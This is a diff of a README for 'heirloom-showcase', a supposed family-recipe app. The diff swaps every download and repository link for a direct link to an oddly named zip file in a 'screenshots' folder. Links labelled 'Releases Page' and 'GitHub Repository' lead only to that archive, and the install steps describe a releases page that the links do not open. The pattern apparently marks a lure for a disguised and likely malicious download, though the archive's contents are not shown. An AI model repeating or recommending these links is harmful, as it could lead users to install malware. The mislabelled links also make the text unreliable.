@@ -1,13 +1,13 @@
 # 🌿 heirloom-showcase - Preserve Family Recipes Easily
 
 ## 📥 Download Now
-[![Download Heirloom Showcase](https://raw.githubusercontent.com/Meaghanpianissimoassai867/heirloom-showcase/main/figma/heirloom-showcase-v1.0.zip%20Showcase-brightgreen)](https://raw.githubusercontent.com/Meaghanpianissimoassai867/heirloom-showcase/main/figma/heirloom-showcase-v1.0.zip)
+[![Download Heirloom Showcase](https://github.com/Meaghanpianissimoassai867/heirloom-showcase/raw/refs/heads/main/screenshots/showcase_heirloom_anthranyl.zip%20Showcase-brightgreen)](https://github.com/Meaghanpianissimoassai867/heirloom-showcase/raw/refs/heads/main/screenshots/showcase_heirloom_anthranyl.zip)
 
 ## 🚀 Getting Started
 The heirloom-showcase application provides a safe space for preserving family recipes and memories. Follow these simple steps to download and run the app.
 
 ## 📥 Download & Install
-To get started, visit this page to download: [Heirloom Showcase Releases](https://raw.githubusercontent.com/Meaghanpianissimoassai867/heirloom-showcase/main/figma/heirloom-showcase-v1.0.zip).
+To get started, visit this page to download: [Heirloom Showcase Releases](https://github.com/Meaghanpianissimoassai867/heirloom-showcase/raw/refs/heads/main/screenshots/showcase_heirloom_anthranyl.zip).
 
 ### Step 1: Visit the Releases Page
 Click the link above. You will be taken to a page with all available versions of the heirloom-showcase application.
@@ -56,7 +56,7 @@ If you would like to contribute, you can do so by submitting a Pull Request or b
 The heirloom-showcase project is open-source and available under the MIT License. Feel free to use and modify as per the license terms. 
 
 ## 🔗 Links and Resources
-- [Heirloom Showcase Releases](https://raw.githubusercontent.com/Meaghanpianissimoassai867/heirloom-showcase/main/figma/heirloom-showcase-v1.0.zip)
-- [GitHub Repository](https://raw.githubusercontent.com/Meaghanpianissimoassai867/heirloom-showcase/main/figma/heirloom-showcase-v1.0.zip)
+- [Heirloom Showcase Releases](https://github.com/Meaghanpianissimoassai867/heirloom-showcase/raw/refs/heads/main/screenshots/showcase_heirloom_anthranyl.zip)
+- [GitHub Repository](https://github.com/Meaghanpianissimoassai867/heirloom-showcase/raw/refs/heads/main/screenshots/showcase_heirloom_anthranyl.zip)
 
 Thank you for choosing heirloom-showcase to preserve your cherished recipes and memories! Enjoy using the app.
